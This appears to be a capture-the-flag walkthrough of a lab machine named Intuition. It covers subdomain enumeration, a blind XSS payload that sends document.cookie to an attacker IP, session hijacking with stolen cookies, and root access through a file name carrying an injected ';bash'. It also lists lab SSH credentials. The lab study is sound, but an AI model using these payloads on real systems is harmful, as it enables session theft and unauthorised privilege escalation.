**Ping**
![[Pasted image 20240711115329.png]]

Nmap Scans
```
mapit 10.10.11.15
```

Nmap Default Scan
![[Pasted image 20240711115424.png]]

Nmap Script and Service Scan
![[Pasted image 20240711115454.png]]

Nmap All Port Scan
![[Pasted image 20240711115511.png]]

Updated my host file
![[Pasted image 20240711115630.png]]

On Port 80 http://comprezzor.htb/
![[Pasted image 20240711115800.png]]

Subdomain Enumeration using ffuf
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://comprezzor.htb -H "Host: FUZZ.comprezzor.htb"
-fs 178
```
![[Pasted image 20240711122153.png]]

Found three subdomains, will add it to our hots file
![[Pasted image 20240711122432.png]]

On http://auth.comprezzor.htb
![[Pasted image 20240711122409.png]]

On http://report.comprezzor.htb/
![[Pasted image 20240711122524.png]]

I have registered a new account and logged in and able to send a report, this form is vulnerable to blind xss
```
<img src=x onerror='eval(atob("ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC42OjQ0NDQvP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk="));'
```
base64 Decoded version
```
<img src=x onerror='eval(atob("fetch('http://10.10.14.6:4444/?cookie='+document.cookie)"));' />
```
![[Pasted image 20240711124215.png]]

Got a user cookie, will use this cookie to login as a another user, he might be admin
![[Pasted image 20240711124356.png]]
Can see the origin http://dashboard.comprezzor.htb Will catch the request first
![[Pasted image 20240711130012.png]]

Now will replace the cookie
```
eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
```
eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogIm5pc2giLCAicm9sZSI6ICJ1c2VyIn18MWI5NGRmMzViOWQ1ODNjZTU4NDY1MDgwZDIzOTk2NjQwNjIyMjE5NWMyZjdkY2NjMWU3YzNmZWRkMzk0ZmMwZg==
![[Pasted image 20240711130114.png]]

Then forward....and Got it...>!
![[Pasted image 20240711130242.png]]


Have to set priority to 1 from our report, so admin will access it, I think the machine as issue, It is not showing my request in the dashboard, so tried hell lot of way, end with machine isssue


Jump to privilege escalation....!

SSH with user lopez and password Lopezz1992%123
```
ssh lopez@10.10.11.15
```
![[Pasted image 20240711135615.png]]

Lopez can run runner2 as root
```
sudo -l
```
![[Pasted image 20240711135748.png]]

Will use this to escalate our privilege
![[Pasted image 20240711142215.png]]

Download the v0.0.3.tar.gz from this link https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz
And move the content of v0.0.3.tar.gz to admin.tar.gz;bash
then create pwn.json file with following content
```
{
        "run":{
                "action":"install",
                "role_file":"admin.tar.gz;bash"
        },
        "auth_code":"UHI75GHINKOP"
}
```

Then run this command to escalate to root
```
sudo /opt/runner2/runner2 pwn.json
```
![[Pasted image 20240711142521.png]]

**User.txt**
![[Pasted image 20240711142706.png]]

**Root.txt**
![[Pasted image 20240711142618.png]]





Done with Intuition......:)